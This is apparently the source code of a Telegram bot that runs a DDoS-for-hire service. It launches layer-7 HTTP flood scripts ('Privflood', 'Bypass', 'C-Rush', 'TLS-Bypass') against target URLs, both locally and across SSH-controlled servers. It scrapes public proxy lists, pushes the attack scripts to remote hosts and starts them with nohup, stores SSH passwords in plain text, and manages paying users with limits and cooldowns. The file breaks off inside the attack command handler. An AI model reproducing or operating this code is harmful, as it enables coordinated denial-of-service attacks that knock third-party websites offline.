/**
 * PRIV L7 Bot Hub v2 — Auto Multi-Server Attack
 *
 * Behavior:
 *  - /attack <method> <args...>       → nyerang dari LOCAL + SEMUA server online (auto)
 *  - /attack <method> <args...> @local → local only
 *  - /attack <method> <args...> @srv_x → server tertentu saja
 *  - Live progress saat dispatch, ringkasan server online vs attacking
 *
 * Install: npm install ssh2 node-telegram-bot-api@0.66.0 axios colors hpack node-bash-title
 * Run:     BOT_TOKEN=xxx ADMIN_ID=123 node bot.js
 */

'use strict';

const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const { spawn } = require('child_process');
const TelegramBot = require('node-telegram-bot-api');
const { Client } = require('ssh2');
const axios = require('axios');

/* ══════════════════════════ CONFIG ══════════════════════════ */

const CONFIG = {
  BOT_TOKEN: process.env.BOT_TOKEN || '',
  ADMIN_IDS: (process.env.ADMIN_ID || '').split(',').filter(Boolean).map(Number),
  SCRIPT_DIR: __dirname,
  DATA_DIR: path.join(__dirname, 'data'),
  DEFAULT_COOLDOWN: Number(process.env.COOLDOWN || 30),
  MAX_CONCURRENT: Number(process.env.MAX_CONCURRENT || 3),
  PROXY_FILE: 'proxy.txt',
  REMOTE_DIR: '/root/attack',
  SSH_TIMEOUT: 20000,
  HEALTH_CACHE_TTL: 30000,   // status valid for 30s before re-check
};

if (!CONFIG.BOT_TOKEN) { console.error('BOT_TOKEN required.'); process.exit(1); }
if (CONFIG.ADMIN_IDS.length === 0) { console.error('ADMIN_ID required.'); process.exit(1); }

fs.mkdirSync(CONFIG.DATA_DIR, { recursive: true });

const USERS_FILE = path.join(CONFIG.DATA_DIR, 'users.json');
const SERVERS_FILE = path.join(CONFIG.DATA_DIR, 'servers.json');
const METHODS_FILE = path.join(CONFIG.DATA_DIR, 'methods.json');
const BLACKLIST_FILE = path.join(CONFIG.DATA_DIR, 'blacklist.json');
const AUDIT_FILE = path.join(CONFIG.DATA_DIR, 'audit.log');
const SESSIONS_FILE = path.join(CONFIG.DATA_DIR, 'sessions.json');

for (const [f, init] of [
  [USERS_FILE, '{}'], [SERVERS_FILE, '[]'], [METHODS_FILE, '[]'],
  [BLACKLIST_FILE, '[]'], [SESSIONS_FILE, '[]'],
]) {
  if (!fs.existsSync(f)) fs.writeFileSync(f, init + '\n');
}

/* ══════════════════════════ STATE ══════════════════════════ */

const sessions = new Map();
const cooldowns = new Map();
const pendingInput = new Map();
const serverConns = new Map();
const healthCache = new Map();   // serverId -> { online, load, at }

/* ══════════════════════════ STORAGE ══════════════════════════ */

function readJSON(f, fb) { try { return JSON.parse(fs.readFileSync(f, 'utf8')); } catch { return fb; } }
function writeJSON(f, d) {
  const tmp = f + '.tmp';
  fs.writeFileSync(tmp, JSON.stringify(d, null, 2) + '\n', { mode: 0o600 });
  fs.renameSync(tmp, f);
}
function audit(event, actor, details = {}) {
  try { fs.appendFileSync(AUDIT_FILE, JSON.stringify({ at: new Date().toISOString(), event, actor, details }) + '\n'); } catch {}
}

/* ══════════════════════════ USERS ══════════════════════════ */

function loadUsers() { return readJSON(USERS_FILE, {}); }
function saveUsers(u) { writeJSON(USERS_FILE, u); }
function getUser(id) { return loadUsers()[String(id)] || null; }

function upsertUser(id, patch) {
  const users = loadUsers();
  const key = String(id);
  users[key] = { ...(users[key] || {}), ...patch, updatedAt: new Date().toISOString() };
  saveUsers(users);
  return users[key];
}

function isAdmin(id) { return CONFIG.ADMIN_IDS.includes(id); }

function ensureUserExists(msg) {
  const id = msg.from.id;
  const existing = getUser(id);
  if (existing) return existing;

  if (isAdmin(id)) {
    return upsertUser(id, {
      telegramId: id, username: msg.from.username || null,
      firstName: msg.from.first_name || null, role: 'admin',
      createdAt: new Date().toISOString(),
      limits: { maxDuration: 0, maxThreads: 0, maxRate: 0, maxConcurrent: 0, cooldown: 0 },
    });
  }

  return upsertUser(id, {
    telegramId: id, username: msg.from.username || null,
    firstName: msg.from.first_name || null, role: 'pending',
    createdAt: new Date().toISOString(),
    limits: { maxDuration: 300, maxThreads: 16, maxRate: 90, maxConcurrent: 1, cooldown: CONFIG.DEFAULT_COOLDOWN },
  });
}

/* ══════════════════════════ BLACKLIST ══════════════════════════ */

function loadBlacklist() { return readJSON(BLACKLIST_FILE, []); }
function saveBlacklist(l) { writeJSON(BLACKLIST_FILE, l); }

function normalizeHost(raw) {
  return String(raw || '').toLowerCase()
    .replace(/^[a-z]+:\/\//, '').replace(/[/?#].*$/, '').replace(/:\d+$/, '').replace(/\.+$/, '');
}

function hostMatches(h, p) {
  h = normalizeHost(h); p = normalizeHost(p);
  if (!h || !p) return false;
  if (p.startsWith('*.')) { const b = p.slice(2); return h === b || h.endsWith('.' + b); }
  return h === p;
}

function isBlacklisted(host) { return loadBlacklist().some(p => hostMatches(host, p)); }

/* ══════════════════════════ METHODS ══════════════════════════ */

const BUILTIN_METHODS = [
  {
    id: 'priv', name: 'Privflood', file: 'priv.js', builtin: true,
    example: 'priv <url> <dur> <threads> <rate> [cookies] [headers] [ddg]',
    parse: (a) => {
      const [target, duration, threads, rate, ...f] = a;
      const b = [target, duration, CONFIG.PROXY_FILE, threads, rate];
      if (f.includes('cookies')) b.push('-c');
      if (f.includes('headers')) b.push('-h');
      if (f.includes('ddg')) b.push('-ddg');
      return { target, duration, threads, rate, args: b };
    },
  },
  {
    id: 'bypass', name: 'Bypass', file: 'bypass.js', builtin: true,
    example: 'bypass <GET|POST> <url> <dur> <threads> <rate> [query=0|1|2|3] [limit] [delay=ms] [ios]',
    parse: (a) => {
      const [method, target, duration, threads, rate, ...o] = a;
      const b = [method.toUpperCase(), target, duration, threads, rate, CONFIG.PROXY_FILE];
      o.forEach(x => {
        if (x.startsWith('query=')) b.push('--query', x.split('=')[1]);
        else if (x === 'limit') b.push('--limit', 'true');
        else if (x.startsWith('delay=')) b.push('--delay', x.split('=')[1]);
        else if (x === 'ios') b.push('--ios');
        else if (x === 'debug') b.push('--debug');
      });
      return { target, duration, threads, rate, args: b };
    },
  },
  {
    id: 'crush', name: 'C-Rush', file: 'l.js', builtin: true,
    example: 'crush <url> <dur> <threads> <rate> [cookies] [headers] [cache]',
    parse: (a) => {
      const [target, duration, threads, rate, ...f] = a;
      const b = [target, duration, CONFIG.PROXY_FILE, threads, rate];
      if (f.includes('cookies')) b.push('-c');
      if (f.includes('headers')) b.push('-h');
      if (f.includes('cache')) b.push('-ch', 'true');
      return { target, duration, threads, rate, args: b };
    },
  },
  {
    id: 'tls', name: 'TLS-Bypass', file: 'tls.js', builtin: true,
    example: 'tls <url> <dur> <rate> <threads>',
    parse: (a) => {
      const [target, duration, rate, threads] = a;
      return { target, duration, threads, rate, args: [target, duration, rate, threads, CONFIG.PROXY_FILE] };
    },
  },
];

function loadCustomMethods() { return readJSON(METHODS_FILE, []); }
function saveCustomMethods(l) { writeJSON(METHODS_FILE, l); }

function allMethods() {
  const custom = loadCustomMethods().map(m => ({
    id: m.id, name: m.name, file: m.file, builtin: false,
    template: m.template, example: m.example || `${m.id} <args...>`,
    parse: (a) => {
      let s = m.template;
      a.forEach((v, i) => { s = s.replace(new RegExp(`\\$${i + 1}`, 'g'), v); });
      s = s.replace(/\{proxy\}/g, CONFIG.PROXY_FILE);
      const arr = s.split(/\s+/).filter(Boolean);
      return { target: a[0], duration: a[1], threads: a[2], rate: a[3], args: arr };
    },
  }));
  return [...BUILTIN_METHODS, ...custom];
}

function getMethod(id) { return allMethods().find(m => m.id === id); }
function availableMethods() {
  return allMethods().filter(m => fs.existsSync(path.join(CONFIG.SCRIPT_DIR, m.file)));
}

/* ══════════════════════════ SERVERS ══════════════════════════ */

function loadServers() { return readJSON(SERVERS_FILE, []); }
function saveServers(l) { writeJSON(SERVERS_FILE, l); }
function getServer(id) { return loadServers().find(s => s.id === id); }

function upsertServer(patch) {
  const list = loadServers();
  const idx = list.findIndex(s => s.id === patch.id);
  if (idx >= 0) list[idx] = { ...list[idx], ...patch };
  else list.push(patch);
  saveServers(list);
  return patch;
}

function removeServer(id) {
  const c = serverConns.get(id);
  if (c) { try { c.end(); } catch {} serverConns.delete(id); }
  healthCache.delete(id);
  saveServers(loadServers().filter(s => s.id !== id));
}

function newServerId() { return 'srv_' + crypto.randomBytes(3).toString('hex'); }

/* Server counts */
function serverStats() {
  const list = loadServers();
  const online = list.filter(s => s.status === 'online').length;
  const offline = list.length - online;
  const attacking = new Set(
    [...sessions.values()]
      .filter(s => s.status === 'running' && s.where === 'remote')
      .map(s => s.serverId)
  ).size;
  return { total: list.length, online, offline, attacking };
}

/* ══════════════════════════ SSH ══════════════════════════ */

function sshConnect(server) {
  return new Promise((resolve, reject) => {
    const conn = new Client();
    const timer = setTimeout(() => { try { conn.end(); } catch {} reject(new Error('SSH timeout')); }, CONFIG.SSH_TIMEOUT);
    conn.once('ready', () => { clearTimeout(timer); resolve(conn); });
    conn.once('error', (e) => { clearTimeout(timer); reject(e); });
    try {
      conn.connect({
        host: server.host, port: server.port, username: server.username, password: server.password,
        readyTimeout: CONFIG.SSH_TIMEOUT,
        algorithms: { serverHostKey: ['ssh-rsa', 'ecdsa-sha2-nistp256', 'ssh-ed25519'] },
      });
    } catch (e) { clearTimeout(timer); reject(e); }
  });
}

function sshExec(conn, cmd, timeoutMs = 120000) {
  return new Promise((resolve) => {
    let done = false;
    const timer = setTimeout(() => { if (!done) { done = true; resolve({ code: -1, out: '', err: 'exec timeout' }); } }, timeoutMs);
    try {
      conn.exec(cmd, (err, stream) => {
        if (err) { clearTimeout(timer); done = true; return resolve({ code: -1, out: '', err: err.message }); }
        let out = '', errOut = '';
        stream.on('data', d => { out += d.toString(); });
        stream.stderr.on('data', d => { errOut += d.toString(); });
        stream.on('close', (code) => { clearTimeout(timer); done = true; resolve({ code: code || 0, out, err: errOut }); });
      });
    } catch (e) { clearTimeout(timer); done = true; resolve({ code: -1, out: '', err: e.message }); }
  });
}

function sshUpload(conn, local, remote) {
  return new Promise((resolve, reject) => {
    conn.sftp((err, sftp) => {
      if (err) return reject(err);
      sftp.fastPut(local, remote, (e) => {
        try { sftp.end(); } catch {}
        if (e) reject(e); else resolve();
      });
    });
  });
}

async function getServerConn(id) {
  if (serverConns.has(id)) {
    const c = serverConns.get(id);
    if (c._ready) return c;
    serverConns.delete(id);
  }
  const server = getServer(id);
  if (!server) throw new Error('Server not found: ' + id);
  const conn = await sshConnect(server);
  conn._ready = true;
  conn.on('close', () => serverConns.delete(id));
  conn.on('error', () => serverConns.delete(id));
  serverConns.set(id, conn);
  return conn;
}

async function checkServerHealth(id, force = false) {
  const cached = healthCache.get(id);
  if (!force && cached && Date.now() - cached.at < CONFIG.HEALTH_CACHE_TTL) return cached;

  try {
    const conn = await getServerConn(id);
    const r = await sshExec(conn, 'echo ok; uptime', 10000);
    const online = r.out.includes('ok');
    const load = (r.out.match(/load average: ([^\n]+)/) || [])[1] || '?';
    const result = { online, load, at: Date.now() };
    healthCache.set(id, result);
    upsertServer({ id, status: online ? 'online' : 'offline', lastCheck: Date.now() });
    return result;
  } catch (e) {
    const result = { online: false, load: '?', error: e.message, at: Date.now() };
    healthCache.set(id, result);
    upsertServer({ id, status: 'offline', lastCheck: Date.now() });
    return result;
  }
}

async function refreshAllServers(force = false) {
  const list = loadServers();
  const results = await Promise.allSettled(list.map(s => checkServerHealth(s.id, force)));
  const online = results.filter(r => r.status === 'fulfilled' && r.value.online).length;
  return { total: list.length, online, offline: list.length - online };
}

/* ══════════════════════════ REMOTE SETUP ══════════════════════════ */

async function setupRemote(server, onProgress) {
  const conn = await sshConnect(server);
  try {
    onProgress && await onProgress('checking node...');
    const nodeCheck = await sshExec(conn, 'command -v node && node -v', 15000);

    if (nodeCheck.code !== 0 || !nodeCheck.out.trim()) {
      onProgress && await onProgress('installing node.js 20...');
      const install = await sshExec(conn,
        'export DEBIAN_FRONTEND=noninteractive; ' +
        'curl -fsSL https://deb.nodesource.com/setup_20.x | bash - 2>&1 | tail -2; ' +
        'apt install -y nodejs build-essential 2>&1 | tail -3', 180000);
      if (install.code !== 0 && !install.out.includes('already')) throw new Error('node install failed');
    } else {
      onProgress && await onProgress('node ready: ' + nodeCheck.out.trim());
    }

    onProgress && await onProgress('creating folder...');
    await sshExec(conn, `mkdir -p ${CONFIG.REMOTE_DIR}`, 10000);

    onProgress && await onProgress('uploading scripts...');
    for (const f of ['priv.js', 'bypass.js', 'l.js', 'tls.js']) {
      const local = path.join(CONFIG.SCRIPT_DIR, f);
      if (fs.existsSync(local)) await sshUpload(conn, local, `${CONFIG.REMOTE_DIR}/${f}`);
    }

    const proxyLocal = path.join(CONFIG.SCRIPT_DIR, CONFIG.PROXY_FILE);
    if (fs.existsSync(proxyLocal)) {
      onProgress && await onProgress('uploading proxies...');
      await sshUpload(conn, proxyLocal, `${CONFIG.REMOTE_DIR}/${CONFIG.PROXY_FILE}`);
    }

    onProgress && await onProgress('installing npm deps...');
    const npm = await sshExec(conn,
      `cd ${CONFIG.REMOTE_DIR} && npm init -y > /dev/null 2>&1; npm install colors hpack node-bash-title axios --silent --no-audit --no-fund 2>&1 | tail -3`,
      240000);
    if (npm.code !== 0) throw new Error('npm install failed');

    onProgress && await onProgress('done ✓');
    return { ok: true };
  } finally {
    try { conn.end(); } catch {}
  }
}

/* ══════════════════════════ ATTACK ══════════════════════════ */

function newSessionId() { return 'sess_' + crypto.randomBytes(3).toString('hex'); }

function userActiveSessions(id) {
  return [...sessions.values()].filter(s => s.owner === id && s.status === 'running').length;
}

function launchLocal(user, method, args) {
  const id = newSessionId();
  const methodPath = path.join(CONFIG.SCRIPT_DIR, method.file);
  if (!fs.existsSync(methodPath)) throw new Error(`File missing: ${method.file}`);

  const child = spawn(process.execPath, [methodPath, ...args], {
    cwd: CONFIG.SCRIPT_DIR, detached: true, stdio: ['ignore', 'pipe', 'pipe'],
    env: { PATH: process.env.PATH || '', NODE_ENV: 'production' },
  });

  const session = {
    id, owner: user.telegramId, method: method.id, methodName: method.name,
    target: args[0] || '?', duration: Number(args[1]) || 0,
    startedAt: Date.now(), status: 'running', where: 'local', child, logs: '',
  };

  child.stdout.on('data', d => { session.logs = (session.logs + d.toString()).slice(-3000); });
  child.stderr.on('data', d => { session.logs = (session.logs + d.toString()).slice(-3000); });
  child.on('exit', () => { session.status = 'done'; setTimeout(() => sessions.delete(id), 30000); });

  session.timer = setTimeout(() => stopSession(id, 'duration_expired'), session.duration * 1000);
  session.timer.unref();
  sessions.set(id, session);
  return session;
}

async function launchRemote(user, method, args, serverId) {
  const server = getServer(serverId);
  if (!server) throw new Error('Server not found: ' + serverId);

  const conn = await getServerConn(serverId);
  const check = await sshExec(conn, `[ -f ${CONFIG.REMOTE_DIR}/${method.file} ] && echo ok`, 8000);
  if (!check.out.includes('ok')) throw new Error(`method missing on ${server.name}`);

  const id = newSessionId();
  const cmd = `cd ${CONFIG.REMOTE_DIR} && nohup node ${method.file} ${args.join(' ')} > /dev/null 2>&1 & echo $!`;
  const r = await sshExec(conn, cmd, 15000);
  const remotePid = parseInt(r.out.trim().split(/\s+/).pop(), 10);

  if (!remotePid || isNaN(remotePid)) throw new Error('no pid from remote');

  const session = {
    id, owner: user.telegramId, method: method.id, methodName: method.name,
    target: args[0] || '?', duration: Number(args[1]) || 0,
    startedAt: Date.now(), status: 'running', where: 'remote',
    serverId, serverName: server.name, remotePid, logs: '',
  };

  session.timer = setTimeout(() => stopSession(id, 'duration_expired'), session.duration * 1000);
  session.timer.unref();
  sessions.set(id, session);
  return session;
}

function stopSession(id, reason = 'manual') {
  const s = sessions.get(id);
  if (!s || s.status !== 'running') return false;

  if (s.where === 'local' && s.child) {
    try { process.kill(-s.child.pid, 'SIGKILL'); } catch { try { s.child.kill('SIGKILL'); } catch {} }
  } else if (s.where === 'remote' && s.remotePid) {
    (async () => {
      try {
        const conn = await getServerConn(s.serverId);
        await sshExec(conn, `kill -9 ${s.remotePid} 2>/dev/null || true`, 8000);
      } catch {}
    })();
  }

  clearTimeout(s.timer);
  s.status = 'stopped';
  audit('attack_stopped', s.owner, { id, reason });
  return true;
}

/* ══════════════════════════ VALIDATION ══════════════════════════ */

function validateTarget(raw) {
  let url;
  try { url = new URL(raw); } catch { throw new Error('URL invalid'); }
  if (url.protocol !== 'https:') throw new Error('must be https://');
  return { url: raw, host: normalizeHost(url.hostname) };
}

function checkLimits(user, d, th, r) {
  const l = user.limits || {};
  if (l.maxDuration > 0 && Number(d) > l.maxDuration) throw new Error(`duration max ${l.maxDuration}s`);
  if (l.maxThreads > 0 && Number(th) > l.maxThreads) throw new Error(`threads max ${l.maxThreads}`);
  if (l.maxRate > 0 && Number(r) > l.maxRate) throw new Error(`rate max ${l.maxRate}`);
}

/* ══════════════════════════ PROXY ══════════════════════════ */

const PROXY_SOURCES = [
  'https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt',
  'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
  'https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/http.txt',
  'https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/http/http.txt',
  'https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt',
  'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt',
  'https://raw.githubusercontent.com/yuceltoluyag/GoodProxy/main/raw.txt',
  'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt',
  'https://raw.githubusercontent.com/mmpx12/proxy-list/master/https.txt',
  'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all',
];

async function scrapeProxies() {
  const seen = new Set();
  for (const src of PROXY_SOURCES) {
    try {
      const r = await axios.get(src, { timeout: 12000 });
      r.data.toString().split(/\r?\n/).forEach(l => {
        const t = l.trim();
        if (/^\d{1,3}(\.\d{1,3}){3}:\d{1,5}$/.test(t)) seen.add(t);
      });
    } catch {}
  }
  const list = [...seen];
  fs.writeFileSync(path.join(CONFIG.SCRIPT_DIR, CONFIG.PROXY_FILE), list.join('\n'));
  return list.length;
}

/* ══════════════════════════ BOT CORE ══════════════════════════ */

const bot = new TelegramBot(CONFIG.BOT_TOKEN, { polling: true });

function esc(s) { return String(s || '').replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&'); }

async function reply(msg, text, opts = {}) {
  try { return await bot.sendMessage(msg.chat.id, text, { parse_mode: 'Markdown', ...opts }); }
  catch { try { return await bot.sendMessage(msg.chat.id, text); } catch {} }
}

async function edit(chatId, messageId, text) {
  try { await bot.editMessageText(text, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' }); }
  catch {}
}

const COMMANDS = new Map();
function cmd(name, handler) { COMMANDS.set(name, handler); }

function adminOnly(msg) {
  if (!isAdmin(msg.from.id)) { reply(msg, '🚫 Admin only.'); return false; }
  return true;
}

/* ───── /start ───── */

cmd('start', async (msg) => {
  const user = ensureUserExists(msg);
  const stats = serverStats();
  const txt = [
    `🔥 *PRIV L7 MULTI-SERVER HUB* 🔥`,
    ``,
    `User: *${esc(msg.from.first_name || 'anon')}*`,
    `ID: \`${msg.from.id}\` · Role: *${esc(user.role)}*`,
    ``,
    `📡 Servers: *${stats.online}/${stats.total}* online · *${stats.attacking}* attacking`,
    ``,
    `*Commands:*`,
    `/attack — launch (auto semua server)`,
    `/methods — attack methods`,
    `/servers — server list & status`,
    `/status — your active sessions`,
    `/stop <id> — stop session`,
    `/scrape — refresh proxies`,
    `/help — full command list`,
  ];
  if (isAdmin(msg.from.id)) {
    txt.push('');
    txt.push('*Admin:*');
    txt.push('/users /approve /ban /adduser /setlimit /stats');
    txt.push('/blacklist /black /unblack');
    txt.push('/addmethod /delmethod /uploadmethod');
    txt.push('/addserver /delserver /servercheck /sync /syncall /refresh');
  }
  await reply(msg, txt.join('\n'));
});

/* ───── /help ───── */

cmd('help', async (msg) => {
  ensureUserExists(msg);
  const m = availableMethods().map(x => `• \`${x.id}\` — ${x.name}`).join('\n');
  const s = serverStats();
  await reply(msg, [
    `*Servers:* ${s.online}/${s.total} online · ${s.attacking} attacking`,
    '',
    '*Methods:*',
    m || '_none_',
    '',
    '*Attack (default = LOCAL + ALL online servers):*',
    '`/attack <method> <args...>`',
    '',
    '*Force only:*',
    '`/attack ... @local` — local only',
    '`/attack ... @srv_xxx` — specific server',
    '`/attack ... @srv_a,srv_b` — multiple',
    '',
    '*All commands:*',
    '/start /help /me /methods /servers /status /stop /scrape /attack',
  ].join('\n'));
});

/* ───── /me ───── */

cmd('me', async (msg) => {
  const user = ensureUserExists(msg);
  const l = user.limits || {};
  const cd = cooldowns.get(msg.from.id);
  const cdLeft = cd && cd.until > Date.now() ? Math.ceil((cd.until - Date.now()) / 1000) : 0;
  await reply(msg, [
    `*Account*`,
    `ID: \`${user.telegramId}\``,
    `Role: *${user.role}*`,
    `Since: ${new Date(user.createdAt).toLocaleDateString()}`,
    ``,
    `*Limits:*`,
    `Duration: ${l.maxDuration || '∞'} · Threads: ${l.maxThreads || '∞'}`,
    `Rate: ${l.maxRate || '∞'} · Concurrent: ${l.maxConcurrent || '∞'}`,
    `Cooldown: ${l.cooldown || 0}s`,
    cdLeft > 0 ? `\n⏳ Cooldown: *${cdLeft}s*` : '',
  ].join('\n'));
});

/* ───── /methods ───── */

cmd('methods', async (msg) => {
  const list = allMethods();
  const txt = ['*Methods:*', ''];
  list.forEach(m => {
    const ok = fs.existsSync(path.join(CONFIG.SCRIPT_DIR, m.file));
    txt.push(`${m.builtin ? '📦' : '🔧'} *${m.name}* (\`${m.id}\`) ${ok ? '✅' : '❌'}`);
    txt.push(`  \`${m.example}\``);
    txt.push('');
  });
  await reply(msg, txt.join('\n'));
});

/* ───── /servers ───── */

cmd('servers', async (msg) => {
  ensureUserExists(msg);
  const list = loadServers();
  const stats = serverStats();
  if (list.length === 0) return reply(msg, '📭 No servers. Admin: `/addserver`');

  const txt = [
    `*Servers* — 🟢 ${stats.online} online · 🔴 ${stats.offline} offline · ⚔️ ${stats.attacking} attacking`,
    '',
  ];
  list.forEach(s => {
    const icon = s.status === 'online' ? '🟢' : s.status === 'offline' ? '🔴' : '⚪';
    const nowAttacking = [...sessions.values()].filter(x => x.status === 'running' && x.serverId === s.id).length;
    const attackTag = nowAttacking > 0 ? ` ⚔️×${nowAttacking}` : '';
    txt.push(`${icon} \`${s.id}\` — *${esc(s.name)}*${attackTag}`);
    txt.push(`  ${esc(s.host)}:${s.port} · user=${esc(s.username)}`);
    txt.push(`  status: \`${s.status}\``);
    txt.push('');
  });
  await reply(msg, txt.join('\n'));
});

/* ───── /refresh ───── */

cmd('refresh', async (msg) => {
  if (!adminOnly(msg)) return;
  const servers = loadServers();
  if (servers.length === 0) return reply(msg, '📭 No servers.');

  const statusMsg = await reply(msg, `🔄 Re-checking ${servers.length} servers...`);

  let done = 0, online = 0;
  await Promise.all(servers.map(async (s) => {
    const r = await checkServerHealth(s.id, true);
    done++;
    if (r.online) online++;
    await edit(msg.chat.id, statusMsg.message_id,
      `🔄 Checking servers... ${done}/${servers.length}\n🟢 ${online} online · 🔴 ${done - online} offline`);
  }));

  await edit(msg.chat.id, statusMsg.message_id,
    `✅ Health check done\n🟢 *${online}* online · 🔴 *${servers.length - online}* offline`);
});

/* ───── /addserver ───── */

cmd('addserver', async (msg, args) => {
  if (!adminOnly(msg)) return;
  if (args.length >= 3) {
    const [addr, username, ...rest] = args;
    const password = rest[0];
    const name = rest.slice(1).join(' ') || addr;
    return addServerFlow(msg, addr, username, password, name);
  }
  pendingInput.set(msg.from.id, { action: 'addserver_addr', data: {}, expires: Date.now() + 300000 });
  await reply(msg, '🔌 *Add Server*\n\nSend `IP:PORT`\nExample: `77.237.244.35:22`\n\n_Cancel: /cancel_');
});

async function addServerFlow(msg, addr, username, password, name) {
  const m = String(addr).match(/^([\d.]+|[\w.-]+):(\d+)$/);
  if (!m) return reply(msg, '❌ Format: `ip:port`');
  const [, host, portStr] = m;
  const port = parseInt(portStr, 10);
  if (!port || port < 1 || port > 65535) return reply(msg, '❌ Invalid port.');

  const id = newServerId();
  const statusMsg = await reply(msg, '🔄 Testing SSH...');

  const server = { id, host, port, username, password, name, status: 'testing',
    addedBy: msg.from.id, addedAt: new Date().toISOString(), lastCheck: 0 };

  try { await sshConnect(server); }
  catch (e) { return edit(msg.chat.id, statusMsg.message_id, `❌ SSH failed: \`${e.message.slice(0, 150)}\``); }

  server.status = 'setting_up';
  upsertServer(server);
  await edit(msg.chat.id, statusMsg.message_id, '✅ SSH OK. Setting up...');

  try {
    await setupRemote(server, async (p) => edit(msg.chat.id, statusMsg.message_id, `⚙️ ${p}`));
    upsertServer({ id, status: 'online', lastCheck: Date.now() });
    healthCache.set(id, { online: true, load: '?', at: Date.now() });
    audit('server_added', msg.from.id, { id, host, port, username });
    const stats = serverStats();
    await edit(msg.chat.id, statusMsg.message_id,
      `✅ *Server added* \`${id}\`\n${esc(name)} · ${esc(host)}:${port}\n\n` +
      `📡 Now: *${stats.online}/${stats.total}* online\n\n` +
      `Next \`/attack\` akan otomatis pakai server ini.`);
  } catch (e) {
    upsertServer({ id, status: 'error', lastCheck: Date.now() });
    await edit(msg.chat.id, statusMsg.message_id, `❌ Setup failed: \`${e.message.slice(0, 200)}\``);
  }
}

/* ───── /delserver ───── */

cmd('delserver', async (msg, args) => {
  if (!adminOnly(msg)) return;
  const id = args[0];
  if (!id) return reply(msg, 'Usage: `/delserver <id>`');
  if (!getServer(id)) return reply(msg, '❌ Not found.');
  removeServer(id);
  await reply(msg, `✅ Removed \`${id}\``);
});

/* ───── /servercheck ───── */

cmd('servercheck', async (msg, args) => {
  ensureUserExists(msg);
  const id = args[0];
  if (!id) return reply(msg, 'Usage: `/servercheck <id>`');
  if (!getServer(id)) return reply(msg, '❌ Not found.');
  await reply(msg, `🔄 Checking \`${id}\`...`);
  const r = await checkServerHealth(id, true);
  if (r.online) await reply(msg, `🟢 \`${id}\` online\nLoad: \`${esc(r.load)}\``);
  else await reply(msg, `🔴 \`${id}\` offline\n\`${esc(r.error || 'unknown')}\``);
});

/* ───── /sync ───── */

cmd('sync', async (msg, args) => {
  if (!adminOnly(msg)) return;
  const id = args[0];
  if (!id) return reply(msg, 'Usage: `/sync <id>`');
  if (!getServer(id)) return reply(msg, '❌ Not found.');
  const sm = await reply(msg, `🔄 Syncing \`${id}\`...`);
  try {
    const conn = await getServerConn(id);
    await sshExec(conn, `mkdir -p ${CONFIG.REMOTE_DIR}`, 10000);
    for (const f of ['priv.js', 'bypass.js', 'l.js', 'tls.js']) {
      const local = path.join(CONFIG.SCRIPT_DIR, f);
      if (fs.existsSync(local)) await sshUpload(conn, local, `${CONFIG.REMOTE_DIR}/${f}`);
    }
    const p = path.join(CONFIG.SCRIPT_DIR, CONFIG.PROXY_FILE);
    if (fs.existsSync(p)) await sshUpload(conn, p, `${CONFIG.REMOTE_DIR}/${CONFIG.PROXY_FILE}`);
    upsertServer({ id, status: 'online', lastCheck: Date.now() });
    await edit(msg.chat.id, sm.message_id, `✅ Synced \`${id}\``);
  } catch (e) {
    await edit(msg.chat.id, sm.message_id, `❌ \`${e.message.slice(0, 150)}\``);
  }
});

/* ───── /syncall ───── */

cmd('syncall', async (msg) => {
  if (!adminOnly(msg)) return;
  const servers = loadServers();
  if (!servers.length) return reply(msg, '📭 No servers.');
  const sm = await reply(msg, `🔄 Syncing ${servers.length} servers...`);
  let ok = 0, fail = 0, done = 0;
  for (const s of servers) {
    try {
      const conn = await getServerConn(s.id);
      await sshExec(conn, `mkdir -p ${CONFIG.REMOTE_DIR}`, 10000);
      for (const f of ['priv.js', 'bypass.js', 'l.js', 'tls.js']) {
        const local = path.join(CONFIG.SCRIPT_DIR, f);
        if (fs.existsSync(local)) await sshUpload(conn, local, `${CONFIG.REMOTE_DIR}/${f}`);
      }
      const p = path.join(CONFIG.SCRIPT_DIR, CONFIG.PROXY_FILE);
      if (fs.existsSync(p)) await sshUpload(conn, p, `${CONFIG.REMOTE_DIR}/${CONFIG.PROXY_FILE}`);
      upsertServer({ id: s.id, status: 'online', lastCheck: Date.now() });
      ok++;
    } catch { upsertServer({ id: s.id, status: 'offline' }); fail++; }
    done++;
    await edit(msg.chat.id, sm.message_id, `🔄 Syncing... ${done}/${servers.length}\n✅ ${ok} ok · ❌ ${fail} fail`);
  }
  await edit(msg.chat.id, sm.message_id, `✅ Done: *${ok}* ok · *${fail}* failed`);
});

/* ───── /attack — AUTO ALL SERVERS ───── */

cmd('attack', async (msg, args) => {
  const user = ensureUserExists(msg);
  if (user.role === 'pending') return reply(msg, '⏳ Account pending approval.');
  if (user.role === 'banned') return reply(msg, '🚫 Banned.');

  // Optional override @local / @srv_xxx / @srv_a,srv_b
  let override = null;
  if (args.length && args[args.length - 1].startsWith('@')) {
    override = args.pop().slice(1);
  }

  const methodId = args[0];
  if (!methodId) return reply(msg, 'Usage: `/attack <method> <args...>`\nDefault = auto all online servers + local.');

  const method = getMethod(methodId);
  if (!method) return reply(msg, `❌ Unknown method \`${methodId}\``);
  if (!fs.existsSync(path.join(CONFIG.SCRIPT_DIR, method.file))) return reply(msg, `❌ Missing: ${method.file}`);

  const cd = cooldowns.get(msg.from.id);
  if (cd && cd.until > Date.now()) {
    const left = Math.ceil((cd.until - Date.now()) / 1000);
    return reply(msg, `⏳ Cooldown: *${left}s*`);
  }

  const limit = user.limits?.maxConcurrent || 0;
  if (limit > 0 && userActiveSessions(msg.from.id) >= limit) {
    return reply(msg, `❌ Max concurrent (${limit}).`);
  }

  let parsed;
  try {
    parsed = method.parse(args.slice(1));
    if (!parsed.target || !parsed.duration || !parsed.threads || !parsed.rate) {
      return reply(msg, `❌ Missing args.\nUsage: \`${method.example}\``);
    }
    const t = validateTarget(parsed.target);
